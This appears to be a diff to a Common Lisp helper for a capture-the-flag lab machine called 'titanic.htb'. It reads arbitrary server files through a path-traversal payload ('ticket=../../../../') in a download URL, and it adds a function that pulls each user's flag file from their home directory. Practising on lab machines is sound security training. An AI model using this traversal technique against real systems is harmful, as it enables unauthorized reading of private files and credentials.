@@ -16,8 +16,10 @@
 ;; Machine functions
 
 (defun titanic/read-file (path)
-  (let ((url (format nil "http://titanic.htb/download?ticket=../../../../~a" path)))
-    (trivial-utf-8:utf-8-bytes-to-string (dex:get url))))
+  (let* ((url (format nil "http://titanic.htb/download?ticket=../../../../~a" path))
+         (res (dex:get url)))
+    (handler-case (trivial-utf-8:utf-8-bytes-to-string res)
+      (error (c) res))))
 
 ;; Generic functions
 
@@ -61,3 +63,7 @@
   (let ((all-users (grm/all-users)))
     (remove-if #'(lambda (u) (member u *default-users* :test #'equal)) 
                all-users)))
+
+(grm/defun grm/user-flag (:read) ()
+  (loop for user in (grm/users)
+        return (str:trim (grm/read (format nil "/home/~a/user.txt" user)))))
